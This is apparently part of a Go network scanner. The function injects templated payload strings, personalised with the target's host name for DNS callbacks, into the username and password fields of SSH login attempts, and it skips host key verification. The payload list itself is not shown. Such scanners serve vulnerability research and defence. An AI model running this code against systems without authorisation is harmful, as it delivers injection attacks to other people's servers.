package main

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func (p *ProcJob) ProcessHostSSH(port string, wg *sync.WaitGroup) error {
	var host string
	if len(port) < 1 {
		host = p.Host
	} else {
		host = fmt.Sprintf("%s:%s", p.Host, port)
	}

	defer wg.Done()

	thisTime := time.Now()
	fmt.Printf("\r%d/%02d/%02d %02d:%02d:%02d Total processed: %d  |  Current: %s  |  Protocol: %s",
		thisTime.Year(), thisTime.Month(), thisTime.Day(), thisTime.Hour(),
		thisTime.Minute(), thisTime.Second(), procCount, host, p.Protocol)

	procCount++

	var dynamicPayloads []string
	sanitisedDnsName := strings.ReplaceAll(host, ".", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, ":", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, "/", "-")
	for _, payload := range xload {
		dynamicPayloads = append(dynamicPayloads, strings.ReplaceAll(payload, "$DNSNAME$", sanitisedDnsName))
	}

	username := dynamicPayloads[rand.Intn(len(dynamicPayloads))]
	password := dynamicPayloads[rand.Intn(len(dynamicPayloads))]

	sshconf := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         3 * time.Second,
	}

	xc := make(chan bool, 1)
	go func() {
		client, err := ssh.Dial("tcp", host, sshconf)
		if err != nil {
			//log.Println(err.Error())
			return
		}
		client.Close()
		xc <- true
	}()

	select {
	case <-xc:
		time.Sleep(time.Duration(delay) * time.Second)
		return nil
	case <-time.After(3 * time.Second):
		return fmt.Errorf("timeout during ssh dial / login")
	}
}
